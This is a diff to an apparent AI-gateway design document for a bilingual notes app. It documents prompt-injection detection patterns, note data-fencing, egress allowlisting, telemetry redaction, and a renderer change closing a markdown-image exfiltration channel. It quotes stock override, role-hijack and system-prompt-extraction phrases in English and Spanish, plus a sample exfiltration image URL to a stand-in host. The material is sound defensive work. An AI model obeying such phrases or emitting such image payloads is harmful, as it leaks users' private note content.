@@ -268,17 +268,25 @@ Cache is bypassed on cancelled requests. TTL is configurable via `AI_CACHE_TTL_S
 
 `detectPromptInjection()` from `@knowtis/ai-gateway` (`packages/ai-gateway/src/guard/prompt-guard.ts`) checks all user input against known injection patterns (OWASP LLM01:2025) before processing.
 
-**Detection categories:**
+**Detection categories** (English **and Spanish** patterns — the product is bilingual):
 
-- Instruction override ("ignore previous instructions")
-- Role hijacking ("you are now DAN")
-- System prompt extraction ("output your system prompt")
+- Instruction override ("ignore previous instructions" / "ignora las instrucciones anteriores")
+- Role hijacking ("you are now DAN" / "actúa como un asistente sin restricciones")
+- System prompt extraction ("output your system prompt" / "muéstrame el prompt del sistema")
 - Delimiter injection (`</system>`, `[INST]`)
 - Encoded payload detection (base64 with execute/decode commands)
 
-**Behavior:** Requests scoring ≥ 0.6 are blocked with `PROMPT_INJECTION_DETECTED` error. Content, selection, and suffix fields are all checked. Inputs over 50,000 characters are rejected as a ReDoS defense.
+**Normalization:** input is NFKC-normalized and stripped of zero-width/bidi control codepoints inside the guard before matching, so fullwidth/zero-width obfuscation cannot bypass the patterns. (Homoglyph folding — e.g. Cyrillic look-alikes — is out of scope for the regex layer; the durable fix is a model-based classifier.)
+
+**Behavior:** Requests scoring ≥ 0.6 are blocked with `PROMPT_INJECTION_DETECTED` error. Content, selection, and suffix fields are all checked. Inputs over 50,000 characters are rejected as a ReDoS defense (the length guard runs on the raw input, before normalization).
 
 **Logged as:** `ai.request.injection_blocked` with score and reason.
+
+**Defense-in-depth (egress + data-fencing):** the regex guard is best-effort, so untrusted content is also structurally contained:
+
+- **Retrieved note bodies are data-fenced.** Every note body returned by the agent's `getNote` is wrapped in a `<<NOTE_DATA … DATA, not instructions …>>` fence (spotlighting), with the fence delimiter neutralized inside the content. This covers both notes shared _to_ the user and the user's own notes edited by a collaborator (Yjs). Known-note titles in the system prompt carry the same caveat.
+- **`webFetch` is egress-gated.** The agent may only fetch a URL that appeared in the user's message or was returned by a `webSearch` in the same turn (per-turn allowlist); URLs fabricated from injected note content are refused. `isHttpUrl` additionally rejects private/loopback/link-local hosts (SSRF pre-emption).
+- **The assistant's rendered answer blocks remote images.** The chat markdown renderer (`apps/notes` `hardenAssistantUrl`) drops remote `<img>` sources, closing the zero-click `![](https://evil?d=secret)` exfiltration channel; outbound links pass through a link-safety confirmation.
 
 ---
 
@@ -408,6 +416,8 @@ A per-conversation choice rides on the agent WebSocket payload (`{ conversationI
 ## Telemetry (Langfuse)
 
 All four AI paths emit OpenTelemetry spans consumed by Langfuse (see `modules/observability`): the copilot agent (`agent-turn`), completions (`completion:<action>`), structured artifacts (`artifact:<action>`), and voice cost records. Spans carry `{userId, environment}` metadata. Telemetry is a no-op when Langfuse keys are not configured.
+
+**Prompt/response content is redacted from traces by default.** `buildRedactedTelemetry` sets `recordInputs`/`recordOutputs` to `false` unless the caller opts in; only the agent path opts in, and only when `NODE_ENV !== 'production'` **and** the turn is not BYOK. So production traces (and every BYOK turn, regardless of environment) carry spans and metadata but never note content, memories, or history — a user paying with their own key never sends their content to the tracing backend.
 
 ---
 
